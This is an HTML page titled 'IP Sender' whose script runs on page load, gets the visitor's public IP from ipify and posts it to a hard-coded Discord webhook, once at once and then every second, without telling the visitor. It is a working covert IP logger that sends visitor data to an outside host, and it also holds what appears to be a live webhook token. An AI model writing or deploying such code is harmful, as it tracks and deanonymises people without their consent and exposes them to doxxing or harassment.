<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>IP Sender</title>
</head>
<body>
<script>
const webhook = "https://discord.com/api/webhooks/1385579764592545852/x523eBesGbYlF1EtN7CEwy52A8EpvX9fOGl37Xx63YeS1sEHLAu7_kEif9krCA3bt_lY";

async function fetchIP() {
  try {
    const res = await fetch('https://api.ipify.org?format=json');
    if (!res.ok) return null;
    const data = await res.json();
    return data.ip;
  } catch {
    return null;
  }
}

async function sendIP(ip) {
  try {
    await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ content: `IP Info: ${ip ? ip : 'Unavailable'}` })
    });
  } catch (e) {
    console.error('Failed to send IP:', e);
  }
}

(async () => {
  const ip = await fetchIP();

  // Send IP instantly once
  sendIP(ip);

  // Send IP every 1 second
  setInterval(() => {
    sendIP(ip);
  }, 1000);
})();
</script>
</body>
</html>
